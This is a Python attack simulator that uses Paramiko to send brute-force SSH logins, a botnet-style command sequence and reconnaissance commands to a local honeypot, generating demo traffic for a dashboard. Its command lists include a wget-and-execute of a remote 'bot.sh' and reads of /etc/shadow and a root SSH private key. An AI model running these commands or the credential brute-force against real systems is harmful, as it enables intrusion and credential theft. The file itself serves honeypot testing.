"""
Attack Simulator — Giả lập các kịch bản tấn công vào Honeypot.

Dùng Paramiko SSH vào chính localhost:2222 (Honeypot) để tạo ra traffic
tấn công thật, giúp demo Dashboard mà không cần chờ hacker bên ngoài.
"""
from __future__ import annotations

import random
import time
import threading
import paramiko


HONEYPOT_HOST = '127.0.0.1'
HONEYPOT_PORT = 2222

# ── Credential lists ─────────────────────────────────────────────────────────

BRUTE_FORCE_CREDS = [
    ('root',   '123456'),
    ('admin',  'admin'),
    ('root',   'password'),
    ('root',   'root'),
    ('ubuntu', 'ubuntu'),
    ('admin',  '123456'),
    ('user',   'user'),
    ('test',   'test'),
    ('root',   '12345678'),
    ('admin',  'password'),
    ('root',   'qwerty'),
    ('pi',     'raspberry'),
    ('vagrant','vagrant'),
    ('root',   'toor'),
    ('admin',  'admin123'),
    ('root',   'passw0rd'),
    ('root',   '1234'),
    ('admin',  '1234'),
    ('root',   'letmein'),
    ('root',   'welcome'),
]

BOTNET_COMMANDS = [
    'uname -a',
    'whoami',
    'cd /tmp',
    'wget http://185.220.101.42/bot.sh',
    'chmod +x bot.sh',
    './bot.sh',
    'crontab -l',
]

RECON_COMMANDS = [
    'uname -a',
    'whoami',
    'id',
    'cat /etc/passwd',
    'cat /etc/shadow',
    'cat /root/.ssh/id_rsa',
    'ifconfig',
    'netstat -tlnp',
    'ps aux',
]


# ── Simulation status tracking ───────────────────────────────────────────────

_status: dict[str, dict] = {}
_lock = threading.Lock()


def get_status(scenario: str) -> dict:
    with _lock:
        return _status.get(scenario, {'state': 'idle'})


def _set_status(scenario: str, state: str, progress: int = 0,
                step: str = '', total: int = 0) -> None:
    with _lock:
        _status[scenario] = {
            'state': state,
            'progress': progress,
            'total': total,
            'step': step,
        }


# ── Helpers ──────────────────────────────────────────────────────────────────

def _quick_connect(username: str, password: str, timeout: float = 5) -> paramiko.SSHClient | None:
    """Kết nối SSH nhanh, trả về client hoặc None."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            HONEYPOT_HOST, port=HONEYPOT_PORT,
            username=username, password=password,
            timeout=timeout, look_for_keys=False, allow_agent=False,
        )
        return client
    except Exception:
        try:
            client.close()
        except Exception:
            pass
        return None


# ── Scenarios ────────────────────────────────────────────────────────────────

def _run_brute_force() -> None:
    total = len(BRUTE_FORCE_CREDS)
    _set_status('brute_force', 'running', 0, 'Starting brute force...', total)

    for i, (user, pwd) in enumerate(BRUTE_FORCE_CREDS):
        _set_status('brute_force', 'running', i + 1,
                    f'Trying {user}/{pwd}', total)
        client = _quick_connect(user, pwd)
        if client:
            try:
                client.close()
            except Exception:
                pass
        time.sleep(0.4)

    _set_status('brute_force', 'done', total, 'Completed', total)


def _run_botnet() -> None:
    total = len(BOTNET_COMMANDS) + 1  # +1 for login step
    _set_status('botnet', 'running', 0, 'Connecting...', total)

    client = _quick_connect('root', '123456')
    if not client:
        _set_status('botnet', 'error', 0, 'Connection failed', total)
        return

    _set_status('botnet', 'running', 1, 'Login successful', total)

    try:
        chan = client.invoke_shell()
        time.sleep(1)
        # Drain banner
        if chan.recv_ready():
            chan.recv(4096)

        for i, cmd in enumerate(BOTNET_COMMANDS):
            _set_status('botnet', 'running', i + 2, f'$ {cmd}', total)
            chan.send(cmd + '\n')
            time.sleep(1.5)

        chan.close()
    except Exception:
        pass
    finally:
        try:
            client.close()
        except Exception:
            pass

    _set_status('botnet', 'done', total, 'Completed', total)


def _run_recon() -> None:
    total = len(RECON_COMMANDS) + 1
    _set_status('recon', 'running', 0, 'Connecting...', total)

    client = _quick_connect('admin', 'admin')
    if not client:
        _set_status('recon', 'error', 0, 'Connection failed', total)
        return

    _set_status('recon', 'running', 1, 'Login successful', total)

    try:
        chan = client.invoke_shell()
        time.sleep(1)
        if chan.recv_ready():
            chan.recv(4096)

        for i, cmd in enumerate(RECON_COMMANDS):
            _set_status('recon', 'running', i + 2, f'$ {cmd}', total)
            chan.send(cmd + '\n')
            time.sleep(1.2)

        chan.close()
    except Exception:
        pass
    finally:
        try:
            client.close()
        except Exception:
            pass

    _set_status('recon', 'done', total, 'Completed', total)


# ── Public API ───────────────────────────────────────────────────────────────

SCENARIOS = {
    'brute_force': _run_brute_force,
    'botnet':      _run_botnet,
    'recon':       _run_recon,
}


def run_scenario(scenario: str) -> bool:
    """Chạy kịch bản trong background thread. Return False nếu đang chạy."""
    func = SCENARIOS.get(scenario)
    if not func:
        return False

    current = get_status(scenario)
    if current.get('state') == 'running':
        return False  # Đang chạy rồi, không cho chạy thêm

    threading.Thread(target=func, daemon=True).start()
    return True
